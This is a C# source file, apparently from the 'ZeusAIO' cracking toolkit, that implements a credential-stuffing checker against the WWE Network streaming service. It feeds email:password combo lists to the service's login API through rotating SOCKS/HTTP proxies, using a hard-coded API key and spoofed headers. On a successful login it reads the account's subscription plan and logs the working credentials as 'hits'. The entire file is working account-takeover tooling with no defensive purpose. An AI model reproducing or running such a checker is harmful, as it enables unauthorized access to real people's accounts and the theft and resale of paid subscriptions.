using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using Newtonsoft.Json.Linq;
using Newtonsoft.Json;

namespace Wwe
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest req = new HttpRequest())
                        {
                            SetBasicRequestSettingsAndProxies(req);

                            req.AddHeader("Content-Type", "application/json");
                            req.AddHeader("x-api-key", "cca51ea0-7837-40df-a055-75eb6347b2e7");
                            req.AddHeader("realm", "dce.wwe");

                            req.UserAgent = "okhttp/3.14.6";

                            string strResponse = req.Post(new Uri("https://dce-frontoffice.imggaming.com/api/v2/login"), new BytesContent(Encoding.Default.GetBytes("{\"id\":\"" + s[0] + "\",\"secret\":\"" + s[1] + "\"}"))).ToString();

                            if (strResponse.Contains("\"authorisationToken\""))
                            {
                                JObject jsonObj = (JObject)JsonConvert.DeserializeObject(strResponse);

                                string authorisationToken = jsonObj["authorisationToken"].ToString();

                                string captures = WWEGetCaptures(authorisationToken);

                                if (captures == "Free")
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - WWE] " + s[0] + ":" + s[1], Color.OrangeRed);
                                    }
                                    Export.AsResult("/Wordpress_frees", s[0] + ":" + s[1]);
                                    return false;
                                }
                                else if (captures == "")
                                {
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - WWE] " + s[0] + ":" + s[1], Color.Green);
                                    }
                                    Export.AsResult("/Wordpress_Capturefailed_hits", s[0] + ":" + s[1]);
                                    return false;
                                }
                                ZeusAIO.mainmenu.hits++;
                                if (Config.config.LogorCui == "2")
                                {
                                    Console.WriteLine("[HIT - WWE] " + s[0] + ":" + s[1] + " | " + captures, Color.Green);
                                }
                                Export.AsResult("/Wordpress_hits", s[0] + ":" + s[1] + " | " + captures);
                                return false;


                            }
                            break;
                        }
                    }
                    catch
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
      
    static string WWEGetCaptures(string authToken)
    {
        while (true)
            try
            {
                using (HttpRequest req = new HttpRequest())
                {
                    SetBasicRequestSettingsAndProxies(req);

                    req.Authorization = "Bearer " + authToken;
                    req.AddHeader("x-api-key", "cca51ea0-7837-40df-a055-75eb6347b2e7");
                    req.AddHeader("realm", "dce.wwe");
                    req.AddHeader("sec-fetch-site", "cross-site");
                    req.AddHeader("sec-fetch-mode", "cors");
                    req.AddHeader("sec-fetch-dest", "empty");
                    req.AddHeader("accept", "application/json");
                    req.AddHeader("accept-language", "en-US,en;q=0.9,fa;q=0.8");
                    req.AddHeader("accept-encoding", "gzip, deflate, br");
                    req.Referer = "https://watch.wwe.com/account";
                    req.AddHeader("Origin", "https://watch.wwe.com");
                    req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36";

                    string strResponse = req.Get(new Uri("https://dce-frontoffice.imggaming.com/api/v2/user/licence")).ToString();

                    if (strResponse.Contains("\"status\":\"ACTIVE\""))
                    {
                        string planType = Regex.Match(strResponse, "\"type\":\"(.*?)\"").Groups[1].Value;
                        string plan = Regex.Match(strResponse, "\"name\":\"(.*?)\"").Groups[1].Value;

                        return $"Plan Type: {planType} - Plan: {plan}";
                    }
                    else if (strResponse.Contains("{\"licences\":[]}") || strResponse == "[]")
                        return "Free";
                    else
                        return "";
                }
            }
            catch
            {
                    ZeusAIO.mainmenu.errors++;
                }
        return "";
    }
    static void SetBasicRequestSettingsAndProxies(HttpRequest req)
        {
            req.IgnoreProtocolErrors = true;
            req.ConnectTimeout = 10000;
            req.KeepAliveTimeout = 10000;
            req.ReadWriteTimeout = 10000;

            {
                string[] proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount)).Split(':');
                ProxyClient proxyClient = ZeusAIO.mainmenu.proxyProtocol == "SOCKS5" ? new Socks5ProxyClient(proxy[0], int.Parse(proxy[1])) : ZeusAIO.mainmenu.proxyProtocol == "SOCKS4" ? new Socks4ProxyClient(proxy[0], int.Parse(proxy[1])) : (ProxyClient)new HttpProxyClient(proxy[0], int.Parse(proxy[1]));
                if (proxy.Length == 4)
                {
                    proxyClient.Username = proxy[2];
                    proxyClient.Password = proxy[3];
                }
                req.Proxy = proxyClient;
            }
        }
    }
}
